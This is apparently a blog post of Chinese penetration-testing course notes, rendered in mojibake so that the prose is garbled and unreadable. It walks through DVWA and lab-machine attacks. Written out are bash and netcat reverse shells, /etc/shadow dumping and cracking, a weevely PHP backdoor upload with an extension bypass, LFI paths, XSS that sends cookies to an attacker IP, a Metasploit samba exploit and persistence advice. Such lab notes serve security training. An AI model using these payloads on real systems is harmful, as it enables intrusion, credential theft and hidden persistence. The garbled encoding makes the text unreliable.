ex.æ•´å€‹å…¬å¸</li></ul><p>é»‘ç®±:æœ€è²¼è¿‘çœŸå¯¦æƒ…å¢ƒ<br>ç™½ç®±:ç›¡å¯èƒ½æä¾›ç›¸é—œè³‡è¨Šçµ¦å—æ¸¬è€…<br>ç°ç®±:é»‘ç™½ç®±æ··å’Œï¼Œæœƒæä¾›è‡ªæˆ‘å®£å‘Šè¡¨ä»¥å¾Œå†çµ¦å—æ¸¬è€…æ¸¬è©¦</p><h2 id="æ»²é€æ¸¬è©¦æµç¨‹"><a href="#æ»²é€æ¸¬è©¦æµç¨‹" class="headerlink" title="æ»²é€æ¸¬è©¦æµç¨‹:"></a>æ»²é€æ¸¬è©¦æµç¨‹:</h2><ol><li>è³‡æ–™è’é›†</li><li>é€æ´æƒæ</li><li>æ¼æ´åˆ©ç”¨<br> ç™½å¸½:<ol start="4"><li>æ¼æ´å›å ±<br> é»‘å¸½:</li><li>ææ¬Šé™</li><li>æŒçºŒæ€§å­˜å–</li><li>é˜²ç¦¦é€ƒè„«(é€ƒè„«æœƒå«çš„é‚£ç¨®è­¦å ±å™¨)</li><li>è³‡æ–™æ”œå‡º(æŠŠDBåˆ†æ‰¹æ”œå‡º)<br><img src="https://i.imgur.com/10o9kG8.jpg"></li></ol></li></ol><h2 id="IOTçš„æ”»æ“Šå‘é‡-Attack-Vector"><a href="#IOTçš„æ”»æ“Šå‘é‡-Attack-Vector" class="headerlink" title="IOTçš„æ”»æ“Šå‘é‡(Attack Vector)"></a>IOTçš„æ”»æ“Šå‘é‡(Attack Vector)</h2><p><img src="https://i.imgur.com/CFMACnJ.jpg"></p><ul><li>Hardware:Physical Interface<br>  çµ¦é–‹ç™¼äººå“¡ä½¿ç”¨ï¼Œå‡ºå» å¾Œä¸¦æœªé—œæ‰ï¼Œè‹¥èƒ½è¨ªå•åˆ°è©²æ¥å£é€šå¸¸éƒ½èƒ½ç›´æ¥å–å¾—rootï¼Œé€šå¸¸åº•å±¤çš†ç‚ºæ˜æ–‡å‚³è¼¸<ul><li>è¨­å‚™å¤–æ®¼ä¸¦æœªæä¾›ä¿è­·æ©Ÿåˆ¶</li><li>åº•å±¤ä½¿ç”¨æ˜æ–‡å‚³è¼¸</li><li>æ¯›åˆºæ”»æ“Š(Glitching):ç”¨å¾®å°çš„é›»å£“ï¼Œå»æ“¾å‹•ç¡¬é«”è¨­å‚™</li><li>æ¸¬ä¿¡åˆ°æ”»æ“Š(Side Channel Attack):åŠ å¯†æ™¶ç‰‡ï¼Œå¯ä»¥å»é‡æ¸¬ä»–çš„é›»å£“ã€éŸ³é »â€¦ï¼Œç”¨é€™äº›æ±è¥¿å»åˆ†æåŠ å¯†çš„æ–¹å¼ã€Keyç­‰ç­‰</li></ul></li><li>éŸŒé«”(Firmware):Hardcode, Enc key, exploit<ul><li>è»Ÿé«”&#x2F;éŸŒé«”æœªé€²è¡ŒåŠ å¯†</li><li>æœ‰æ•æ„Ÿè³‡æ–™</li></ul></li><li>Software:Andriod app</li><li>Radio:Cellular, WiFi, èœ‚çª©ç¶²è·¯<ul><li>ç„¡ç·šé€šè¨ŠæœªåŠ å¯†å¯é€²è¡Œå—…æ¢(Sniffer)</li><li>å¹²æ“¾æ”»æ“Š(Jamming)</li><li>é‡æ”¾æ”»æ“Š</li><li>æ¨¡ç³Šæ”»æ“Š(fuzz):éœ€å…ˆæ“¬å‘å·¥ç¨‹æ‰èƒ½fuzz</li><li>é€šè¨Šå”å®š:æœ€éº»ç…©ï¼Œéœ€è¦åŸå» è™•ç†</li></ul></li><li>Cloud:<ul><li>APIæ”»æ“Š</li><li>æ³¨å…¥æ”»æ“Š</li><li>èº«åˆ†èªè­‰&#x2F;æˆæ¬Šæ©Ÿåˆ¶</li><li>é‚è¼¯æ¼æ´</li><li>webæ¼æ´</li></ul></li></ul><h2 id="ç¶²é çš„æ”»æ“Šå‘é‡"><a href="#ç¶²é çš„æ”»æ“Šå‘é‡" class="headerlink" title="ç¶²é çš„æ”»æ“Šå‘é‡"></a>ç¶²é çš„æ”»æ“Šå‘é‡</h2><p><img src="https://i.imgur.com/zfkdfrI.jpg"><br>Web1.0</p><ul><li>å¸ƒå‘Šæ¬„çš„æ¦‚å¿µ</li><li>åªæœ‰éœæ…‹ç¶²é </li></ul><p>Web2.0</p><ul><li>å¯è®€å¯«ï¼Œå¤šåŠŸèƒ½çš„å‹•æ…‹é é¢</li><li>æ‡‰ç”¨ç¨‹åº</li><li>DB(å€‹è³‡)</li><li>API</li><li>ä¸åŒç”¨æˆ¶æœƒæœ‰ä¸åŒçš„é é¢</li></ul><p>Web3.0</p><ul><li>å»ä¸­å¿ƒåŒ–(è³‡æ–™åˆ†æ•£æ”¾)</li></ul><p>HTTP</p><ul><li>ç”±Request&#x2F;Responseçµ„æˆ</li><li>ç”±æ–¼HTTPå±¬æ–¼ç„¡ç‹€æ…‹ï¼Œå› æ­¤éœ€ä¾è³´cookieæ©Ÿåˆ¶ä¾†è¨˜éŒ„userè³‡è¨Šèˆ‡time</li><li>ç‹€æ…‹ç¢¼<br>  <img src="https://i.imgur.com/Bk1hb59.png"></li></ul><h2 id="æ”»æ“Šæ¨™çš„"><a href="#æ”»æ“Šæ¨™çš„" class="headerlink" title="æ”»æ“Šæ¨™çš„"></a>æ”»æ“Šæ¨™çš„</h2><ol><li>ä½¿ç”¨è€…èº«åˆ†</li></ol><ul><li>èªè­‰</li><li>æ¬Šé™åŠƒåˆ†</li><li>Session<br>ex.HTTPå°åŒ…æ ¼å¼çš†ç›¸åŒï¼Œè©²åŸºç«™</li></ul><ol start="2"><li>è¼¸å…¥è¼¸å‡º:</li></ol><ul><li>Sql Injection</li><li>Command Injection</li><li>éœ€ç¶“éæ­£è¦åŒ–è™•ç†</li><li>é–‹ç™¼è€…éœ€è¦è¨­å®šç¢ºå®šçš„å­—å…ƒ<br>ex. æ•¸å­—æ¬„ä½å¡«ä¸­æ–‡æˆ–è‹±æ–‡</li></ul><ol start="3"><li>ç¨‹å¼é‚è¼¯</li></ol><h2 id="å¸¸ç”¨å·¥å…·"><a href="#å¸¸ç”¨å·¥å…·" class="headerlink" title="å¸¸ç”¨å·¥å…·:"></a>å¸¸ç”¨å·¥å…·:</h2><p>Information Gathering:åˆ†ç‚ºä¸»å‹•ã€è¢«å‹•</p><ul><li><p>ä¸»å‹•è³‡è¨Šè’é›†<br>  <img src="https://i.imgur.com/M9nPHnv.png"></p><ul><li>nmapä¸»å‹•è’é›†ç›®æ¨™è³‡è¨Š:æƒæç›®æ¨™ä¸»æ©Ÿport<br>  <img src="https://i.imgur.com/GTvO6kr.jpg"></li><li>Niktoé–‹æºçš„ç¶²ç«™å¼±é»æƒæå·¥å…·:è‡ªå¸¶åœ¨Kaliå…§</li><li>Dirbæš´åŠ›æšèˆ‰ç¶²é ä¸‹çš„ç›®éŒ„èˆ‡æª”æ¡ˆ  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirb url</span><br><span class="line">#å»çœ‹ç¶²é å…§å­˜ä¸å­˜åœ¨æ•æ„Ÿè³‡æ–™</span><br><span class="line">#æœ‰å¯èƒ½å¯ä»¥æƒå‡ºä½¿ç”¨è€…çš„è·¯å¾‘</span><br><span class="line">#å¦‚æœæœ‰é–‹é˜¿å¸•å¥‘ä½œç‚ºä¸­ç¹¼ç«™ï¼Œèƒ½æƒå‡ºä¾†</span><br></pre></td></tr></table></figure></li></ul></li><li><p>è¢«å‹•è³‡è¨Šè’é›†</p><ul><li><p>ç”¨è¢«å‹•è³‡æ–™(IPã€å§“åã€ç”Ÿæ—¥..)ä¾†æè¿°ç›®æ¨™</p></li><li><p>ä¸èˆ‡ç›®æ¨™ç›´æ¥æ¥è§¸ï¼Œé¿å…ç•™ä¸‹ç—•è·¡</p></li><li><p>SHODAN</p><ul><li>å¯ä»¥æƒæä¸–ç•Œä¸Šæ‰€æœ‰çš„ç‰©è¯ç¶²è¨­å‚™</li><li>ä¸»æ©Ÿ</li><li>é–‹å•Ÿç«¯å£</li><li>æ˜¯å¦æœ‰å·²çŸ¥æ¼æ´</li><li>å¯ä½¿ç”¨ä¸‹æ–¹é—œéµå­—æœå°‹:<ul><li>hostnameï¼šæœå°‹æŒ‡å®šçš„ä¸»æ©Ÿæˆ–åŸŸåï¼Œä¾‹å¦‚ hostname:â€googleâ€</li><li>portï¼šæœå°‹æŒ‡å®šçš„åŸ æˆ–æœå‹™ï¼Œä¾‹å¦‚ port:â€21â€</li><li>countryï¼šæœå°‹æŒ‡å®šçš„åœ‹å®¶ï¼Œä¾‹å¦‚ country:â€CNâ€</li><li>cityï¼šæœå°‹æŒ‡å®šçš„åŸå¸‚ï¼Œä¾‹å¦‚ city:â€Hefeiâ€</li><li>orgï¼šæœå°‹æŒ‡å®šçš„çµ„ç¹”æˆ–å…¬å¸ï¼Œä¾‹å¦‚ org:â€googleâ€</li><li>ispï¼šæœå°‹æŒ‡å®šçš„ISPä¾›æ‡‰å•†ï¼Œä¾‹å¦‚ isp:â€China Telecomâ€</li><li>productï¼šæœå°‹æŒ‡å®šçš„ä½œæ¥­ç³»çµ±&#x2F;è»Ÿé«”&#x2F;å¹³è‡ºï¼Œä¾‹å¦‚ product:â€Apache httpdâ€</li><li>versionï¼šæœå°‹æŒ‡å®šçš„è»Ÿé«”ç‰ˆæœ¬ï¼Œä¾‹å¦‚ version:â€1.6.2â€</li><li>geoï¼šæœå°‹æŒ‡å®šçš„åœ°ç†ä½ç½®ï¼Œå¼•æ•¸ç‚ºç¶“ç·¯åº¦ï¼Œä¾‹å¦‚ geo:â€31.8639, 117.2808â€</li><li>before&#x2F;afterï¼šæœå°‹æŒ‡å®šæ”¶éŒ„æ™‚é–“å‰å¾Œçš„è³‡æ–™ï¼Œæ ¼å¼ç‚ºdd-mm-yyï¼Œä¾‹å¦‚ before:â€11-11-15â€</li><li>netï¼šæœå°‹æŒ‡å®šçš„IPåœ°å€æˆ–å­ç¶²ï¼Œä¾‹å¦‚net:â€210.45.240.0&#x2F;24â€</li><li>åƒè€ƒ:<ul><li><a href="https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf">https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf</a></li><li><a href="https://www.itread01.com/content/1546699324.html">https://www.itread01.com/content/1546699324.html</a></li></ul></li></ul></li></ul></li><li><p>Google Hacking</p><ul><li>ç”¨Google Searché‡å°ç›®æ¨™é€²è¡Œæƒ…å ±æœå°‹</li><li>ç”¨â€site:â€å»æœå°‹</li></ul></li></ul></li><li><p>éæ¿¾å°åŒ…</p><ul><li>Burp Suite<br>  ä½¿ç”¨æ–¹æ³•:<br>  ä½¿ç”¨Kali é–‹å•ŸBurp Site<br>  <img src="https://i.imgur.com/8gomHwp.png"><br>  é–‹å•Ÿproxy è¡¨ç¤ºä¹‹å¾Œæ‰€æœ‰æµé‡éƒ½æœƒç¶“éburp<br>  &lt;ä¹‹å‰çš„ç‰ˆæœ¬éœ€è¦ç°½æ†‘è­‰&gt;<br>  ä½¿ç”¨Proxyé–‹å•Ÿbrowser<br>  <img src="https://i.imgur.com/dWxhFur.png"><br>  é€²åˆ°project option&gt;MIST&gt;å‹¾é¸Enable<br>  <img src="https://i.imgur.com/vswHeoq.png"><br>  å°±å¯ä»¥ç¹¼çºŒä½¿ç”¨proxy<br>  <img src="https://i.imgur.com/HwXBX1w.png"><br>  å°‡IPorç¶²å€åŸ·è¡Œæ–¼ç€è¦½å™¨ä¸­ï¼Œå°åŒ…å°±æœƒè¢«æ””æˆªé€²brower<br>  <img src="https://i.imgur.com/OATh3RT.png"><br>  <br><br></li></ul></li><li><p>æš´åŠ›ç ´è§£<br>  <img src="https://i.imgur.com/YuudCcZ.png"><br>  <img src="https://i.imgur.com/kf2mOL5.png"><br>  ä¸åŒçš„Attack typeæœ‰ä¸åŒæ¨¡å¼<br>  sniper:é‡å°å­—å…¸ä¸­è¨­å®šçš„å€¼äº¤æ›¿é †åºæ¸¬è©¦<br>  <img src="https://i.imgur.com/An2qwjw.png"><br>  å°‡å­˜å–å…§å®¹å‚³åˆ°Repeaterç¢ºèªå›æ‡‰çµæœ<br>  <img src="https://i.imgur.com/Tgird85.png"></p><p>  <img src="https://i.imgur.com/nwWHDyM.png"></p></li></ul><br><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>å› ç‚ºæ²’æœ‰é‡å°ç”¨æˆ¶è¼¸å…¥é€²è¡Œéæ¿¾ï¼Œå› æ­¤æœƒé€ æˆæ©Ÿæ•è³‡æ–™å¤–æ´©ã€ç­‰å•é¡Œ<br>Linux command</p><table><thead><tr><th>Column 1</th><th>Column 2</th></tr></thead><tbody><tr><td>; or &amp;</td><td>ä¸ç®¡ç¬¬ä¸€æ¬¡åŸ·è¡Œçš„æŒ‡ä»¤æ˜¯å¦æˆåŠŸçš†æœƒåŸ·è¡Œç¬¬äºŒå€‹</td></tr><tr><td>&amp;&amp;</td><td>ç¬¬ä¸€å€‹æŒ‡ä»¤å¤±æ•—ä¸æœƒåŸ·è¡Œä¸‹ä¸€å€‹</td></tr><tr><td>I(æ§“æ§“ç¬¦è™Ÿ)</td><td>æœƒæŠŠå‰ä¸€å€‹æŒ‡ä»¤çš„è¼¸å‡ºç•¶ä½œä¸‹ä¸€å€‹æŒ‡ä»¤çš„è¼¸å…¥</td></tr><tr><td>II(æ§“æ§“ç¬¦è™Ÿ)</td><td>æœƒæŠŠå‰ä¸€å€‹æŒ‡ä»¤çš„è¼¸å‡ºç•¶ä½œä¸‹ä¸€å€‹æŒ‡ä»¤çš„è¼¸å…¥</td></tr></tbody></table><hr><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>1.Enter IP to get shell</p><p><img src="https://i.imgur.com/GZG7eOA.png"><br>å¯ä½¿ç”¨commandåŠ å…¥ä¸€äº›linuxæŒ‡ä»¤<br><img src="https://i.imgur.com/FI8yUNJ.png"></p><p><img src="https://i.imgur.com/33iCHlV.png"><br>catå»æ’ˆ &#x2F;etc&#x2F;shadow<br><img src="https://i.imgur.com/zthZGDt.png"><br>ls -al æŸ¥çœ‹æª”æ¡ˆæ¬Šé™<br><img src="https://i.imgur.com/Fl5HR9S.png"></p><p>ls -al | grep shadow<br>linux<br>&#x2F;etc&#x2F;passwd linuxä»¥å‰æœƒæŠŠæ‰€æœ‰å¸³å¯†æ”¾åœ¨è£¡é¢<br>&#x2F;etc&#x2F;shadow ç¾åœ¨linuxæœƒå°‡å®ƒåˆ†é–‹</p><h4 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a><em>Reverse shell</em></h4><p>å—å®³è€…çš„æ©Ÿå™¨è‡ªè¡Œé€£å›æ”»æ“Šè€…çš„æ©Ÿå™¨(å‡ºä¾†æ¯”é€²å»ç°¡å–®)</p><p><strong>Bash</strong></p><ul><li>Victim: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</li><li>Attacker:nc -nvlp port</li></ul><p><strong>Netcat</strong></p><ul><li>Victim:nc ip port -e &#x2F;bin&#x2F;bash</li><li>Attacker:nc -nvlp port</li></ul><p><img src="https://i.imgur.com/WHPfdBH.png"></p><p><strong>john the ripper</strong>æš´åŠ›ç ´è§£<br>å¯ä»¥åƒè€ƒLinux çš„ &#x2F;etc&#x2F;shadow æª”æ¡ˆçµæ§‹<br><a href="https://blog.gtwang.org/linux/linux-etc-shadow-file-format/">https://blog.gtwang.org/linux/linux-etc-shadow-file-format/</a></p><p>xdg-open &gt;&gt; å‘ˆç¾fileè®“ä½ å¯ä»¥ç›´æ¥é–‹å•Ÿæ–‡ä»¶</p><br><p><strong>ç ´è§£liunx rootå¯†ç¢¼</strong><br>å°‡passwdå’Œshadowåˆä½µ å¯«å…¥crackä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd shadow &gt; crack</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/vRRh7bK.png"><br>ä½¿ç”¨johnä¾†ç ´è§£å¯†ç¢¼<br><img src="https://i.imgur.com/JiAkG0d.png"></p><p><strong>ç ´è§£Window rootå¯†ç¢¼</strong><br>SAM file<br>NTLM hash<br>Net-NTLM ç¶²è·¯ä¸Šåšé‡‘é‘°äº¤æ›çš„åœ°æ–¹</p><p><strong>CVE Details</strong><br>å¯ä»¥å»è¿½è¹¤<br>ä¸æœƒæœ‰è¦æ€éº¼åˆ©ç”¨è©²æ¼æ´çš„ç¨‹å¼ç¢¼<br><strong>Expoitdb</strong><br>å¯ä»¥è¿½è¹¤æ¼æ´<br>remote code execution(RCE)é ç¨‹ä»£ç¢¼åŸ·è¡Œæ¼æ´</p><p><strong>Metasploit</strong><br><a href="https://ithelp.ithome.com.tw/articles/10224527">https://ithelp.ithome.com.tw/articles/10224527</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/fGYsqLW.png"></p><p><img src="https://i.imgur.com/nUGB4m6.png"></p><h2 id="é¶æ©Ÿæ¸¬è©¦-192-168-5-107"><a href="#é¶æ©Ÿæ¸¬è©¦-192-168-5-107" class="headerlink" title="é¶æ©Ÿæ¸¬è©¦(192.168.5.107)"></a>é¶æ©Ÿæ¸¬è©¦(192.168.5.107)</h2><h3 id="NET-config"><a href="#NET-config" class="headerlink" title="NET config"></a>NET config</h3><p>ç¶²è·¯è¦ä½¿ç”¨æ©‹æ¥ä»‹é¢å¡</p><ol><li><p>&lt;è³‡æ–™è’é›†&gt;å…ˆæ¸¬è©¦å—å®³æ©Ÿçš„portæœ‰ä»€éº¼æ˜¯é–‹å•Ÿçš„<br>ä½¿ç”¨nmapæŸ¥çœ‹å·²é–‹å•Ÿçš„port<br><img src="https://i.imgur.com/4YYhxLY.png"><br>å¯ä»¥æŸ¥çœ‹binè£¡é¢æœ‰ä»€éº¼commandå¯ä»¥ä½¿ç”¨<br><img src="https://i.imgur.com/5HngrIj.png"></p></li><li><p>&lt;åˆ©ç”¨å¼±é»&gt;ç™»å…¥<br>ä½¿ç”¨SQL Injectionå»ç™»å…¥</p></li><li><p>ä½¿ç”¨å—å®³è€…é›»è…¦é€£å›æ”»æ“Šè€…é›»è…¦<br>å¯ä½¿ç”¨ä¸‹æ–¹é€™å…©å€‹å»</p></li></ol><ul><li>bash</li><li>netcat</li></ul><ol start="4"><li><p>&lt;è³‡æ–™è’é›†&gt;è’é›†å—å®³è€…é›»è…¦è³‡è¨Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname-a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/W7DQDcI.png"></p></li><li><p>&lt;å¼±é»æƒæ&gt;ä½¿ç”¨exploitsdbæŸ¥è©¢æ¼æ´<br> <img src="https://i.imgur.com/IajKmAT.png"></p><p> <img src="https://i.imgur.com/BFOaibq.png"></p></li><li><p>åœ¨æœ¬åœ°é›»è…¦é–‹å•Ÿapacheæœå‹™<br> <img src="https://i.imgur.com/6Cimn6A.png"><br> é–‹å•Ÿç•«é¢å¦‚ä¸‹<br> <img src="https://i.imgur.com/TZk5bR6.png"><br> å°‡éœ€è¦çš„æª”æ¡ˆæ”¾é€²apacheè³‡æ–™å¤¾ä¸­ï¼Œä½¿å¾—ä¹‹å¾Œå—å®³é›»è…¦å¯ä»¥ä¸‹è¼‰apacheä¸­çš„è³‡æ–™<br> <img src="https://i.imgur.com/AO8UQ2n.png"><br> <img src="https://i.imgur.com/Pe9lYUr.png"></p></li><li><p>&lt;åˆ©ç”¨æ¼æ´&gt;åœ¨å—å®³è€…é›»è…¦ä¸­ä¸‹è¼‰æ¼æ´æª”æ¡ˆ<br> ä½¿ç”¨pwdç¢ºèªä½å€æŒ‡å‘tmp<br> (ç”±æ–¼æ¬Šé™ä¸è¶³å› æ­¤éœ€è¦æ‰¾ä¸€å€‹ç•¶å‰æ¬Šé™å¯ä»¥è®€å¯«çš„ä½å€)<br> ä½¿ç”¨wgetä¸‹è¼‰æœ¬æ©Ÿé–‹å•Ÿçš„apache<br> <img src="https://i.imgur.com/RdeYP6B.png"><br> <img src="https://i.imgur.com/wVEsi1U.png"><br> ç¢ºèªæ¬Šé™<br> <img src="https://i.imgur.com/oc9Q7jV.png"></p></li></ol><h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>ä½¿ç”¨weevelyç”Ÿæˆbackdoor.php<br><img src="https://i.imgur.com/perGeXy.png"><br>å°‡æª”æ¡ˆä¸Šå‚³å›dvwaçš„ç¶²ç«™<br><img src="https://i.imgur.com/uZlHxZq.png"><br>ä½¿ç”¨weevelyé€£åˆ°è©²ä¸Šå‚³è·¯å¾‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://IP/dvwa/hackable/uploads/backdoor.php pwd(å¯†ç¢¼)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/PkDJBTn.png"><br>æŸ¥çœ‹é–‹ä¸»æ©Ÿç‹€æ…‹<br><img src="https://i.imgur.com/L9KupbP.png"></p><p>&lt;ä¸­ç­‰é›£åº¦&gt;<br>å‰ç«¯æœƒæ“‹éimageæœƒæ“‹<br>å…ˆå°‡æƒ¡æ„æª”æ¡ˆæ”¹æˆ.jpeg</p><p>ä¸Šå‚³è©²æª”æ¡ˆï¼Œä½¿ç”¨burp suiteæ””æˆªå°åŒ…ï¼Œä¸¦å°‡å°åŒ…å…§æª”åæ›´æ”¹ç‚ºphpå³å¯<br><img src="https://i.imgur.com/DKwFDBe.png"></p><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)</p><p>æ•æ„Ÿæª”æ¡ˆ:</p><ul><li><strong>&#x2F;etc&#x2F;passwd</strong></li><li><strong>&#x2F;var&#x2F;log&#x2F;auth.log</strong><ul><li>ç´€éŒ„å“ªäº›useré€£é€™å°æ©Ÿå™¨</li></ul></li><li><strong>&#x2F;var&#x2F;log&#x2F;apacke2&#x2F;access.log&#x2F;error.log</strong><ul><li>æœ‰å‡ºç¾éå“ªäº›éŒ¯èª¤è¨Šæ¯</li></ul></li><li><strong>..&#x2F;..&#x2F;..&#x2F;</strong><ul><li>å¯ä»¥å»ç¿»ä»–æœ‰é‚£äº›æª”æ¡ˆ</li></ul></li><li><strong>%WINDIR%\win.ini</strong><ul><li>winè¨­å®šæª”ï¼Œå¯ä»¥çœ‹config</li></ul></li></ul><p>å¯ä»¥åœ¨?page&#x3D;å¾Œé¢æ”¾å…¥<strong>çµ•å°è·¯å¾‘</strong>ä¾†æŸ¥æ‰¾è³‡æ–™<br><img src="https://i.imgur.com/KLw7zdD.png"></p><p><img src="https://i.imgur.com/2pHxd91.png"></p><p><img src="https://i.imgur.com/QGulfsK.png"></p><h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>æœ‰RFIæ¼æ´<br>éœ€è¦é–‹å•Ÿfuncion:</p><ul><li>allow_url_fopen</li><li>allow_url_include</li></ul><p><img src="https://i.imgur.com/DDVoXPL.png"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>è·¨è…³æœ¬æ”»æ“Š(Cross Site Scripting)<br>æ”»æ“Šå°è±¡ç‚ºuserç«¯ï¼Œéserverç«¯</p><p>æ¼æ´åˆ©ç”¨æ¢ä»¶</p><ul><li>ä¼ºæœå™¨å°ç”¨æˆ¶æäº¤æ•¸æ“šéæ¿¾ä¸å¤ åš´è¬¹</li><li>ä½¿ç”¨ç¤¾äº¤å·¥ç¨‹è®“å—å®³è€…é»æ“Šè§¸ç™¼<br>å½±éŸ¿:</li><li>é‡å®šå‘(æ›é¦¬)ä¸æ‡‰è©²è¢«å€’åˆ°çš„ç¶²ç«™</li><li>ç›œå–cookie</li><li>é‡£é­š<br>é¡å‹:</li><li>åå°„å‹:è¿”å›è…³æœ¬ä¸¦ç”±userè¦å»é»æ“Šæ‰æœƒä¸­æ‹›</li><li>å„²å­˜å‹:js code å­˜åœ¨serverç«¯ï¼Œä¸ç®¡useræœ‰æ²’æœ‰é»æ“Šï¼Œéƒ½æœƒè§¸ç™¼ã€‚</li></ul><p>ä¸‹js code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;call 911&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/T3rDDKJ.png"><br><img src="https://i.imgur.com/oOGulM2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/191wpbd.png"><br><img src="https://i.imgur.com/0T1ttyT.png"></p><p>å¾useré‚£é‚Šå·åˆ°è¨Šæ¯å‚³åˆ°æ”»æ“Šè€…ç«¯<br>ç›£è½80 port<br>è¼¸å…¥js code é€£åˆ°æ”»æ“Šè€…IPå›å‚³cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new image().src=&quot;http://ip/output=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Q0T1jW9.png"></p><p>&lt;ä¸­ç­‰é›£åº¦&gt;<br>éæ¿¾æ‰scriptï¼Œå‰‡å¯ä»¥ä½¿ç”¨å¤§å°å¯«ä¾†æ··æ·†ä»–<br>ex.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCripT&gt;new image().src=&quot;http://ip/output=&quot;+document.cookie;&lt;/sCripT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/4Y4hqwD.png"></p><p><img src="https://i.imgur.com/e26A9bc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>XSS stored</p><p><img src="https://i.imgur.com/gJi4QzR.png"></p><p><img src="https://i.imgur.com/QEBAcB9.png"></p><h2 id="é¶æ©Ÿæ¸¬è©¦2-192-168-0-182"><a href="#é¶æ©Ÿæ¸¬è©¦2-192-168-0-182" class="headerlink" title="é¶æ©Ÿæ¸¬è©¦2(192.168.0.182)"></a>é¶æ©Ÿæ¸¬è©¦2(192.168.0.182)</h2><ol><li>è’é›†è³‡æ–™<br>ä½¿ç”¨dirbè’é›†ç¶²é è³‡æ–™</li></ol><p>ä½¿ç”¨nmap -A æŸ¥çœ‹è©²ä¸»æ©Ÿæœ‰ç”šéº¼Portæ˜¯é–‹å•Ÿçš„<br><img src="https://i.imgur.com/M19pxyW.png"><br>å…¶ä¸­å¯ä»¥æœsambaæƒæ&#x2F;æ”»æ“Š<br>(sambaçš„æ´æŒºå¤šçš„)</p><ol start="2"><li><p>é–‹å•Ÿmsfconsolse<br><img src="https://i.imgur.com/zXZNme2.png"></p></li><li><p>Search sambaæ¼æ´<br><img src="https://i.imgur.com/4FDBxJQ.png"></p></li><li><p>ç·¨è­¯æ¼æ´è…³æœ¬<br><img src="https://i.imgur.com/4LaDpTB.png"></p></li><li><p>åŸ·è¡Œæ¼æ´è…³æœ¬<br><img src="https://i.imgur.com/97zdWV8.png"><br>(å³å¯é€£é€²å»å–å¾—root)</p></li></ol><p>è¦æ€éº¼ç¶­æŒé€£ç·šç¨‹åº????<br><strong>è¶Šè²¼è¿‘ä½¿ç”¨è€…è¡Œç‚ºè¶Šå¥½è¶Šé›£ç™¼ç¾</strong><br>1.å»ºä¸€å€‹æ–°çš„å¸³è™Ÿ<br>2.çˆ†ç ´å®ƒå…¶ä»–çš„å¸³è™Ÿå¯†ç¢¼<br>3.å¡ä¸€å€‹æœå‹™ (ä½†æœ‰å¯èƒ½æœƒè¢«ADæ–·æ‰)<br>4.å»ºä¸€å€‹é€£ç·šå›åˆ°è‡ªå·±ä¸»æ©Ÿ (ä½†æœ‰å¯èƒ½æœƒè¢«ADæ–·æ‰)</p><p>How To Create a Sudo User in Linux?<br><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart">https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart</a></p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>æ””æˆªä¿®æ”¹å¯†ç¢¼çš„é é¢<br><img src="https://i.imgur.com/FUBku23.png"></p><p>è¤‡è£½å°åŒ…çš„URI<br><img src="https://i.imgur.com/1LTXzYP.png"></p><p>åŸ·è¡ŒURIå³å¯æ›´æ”¹å¯†ç¢¼<br><img 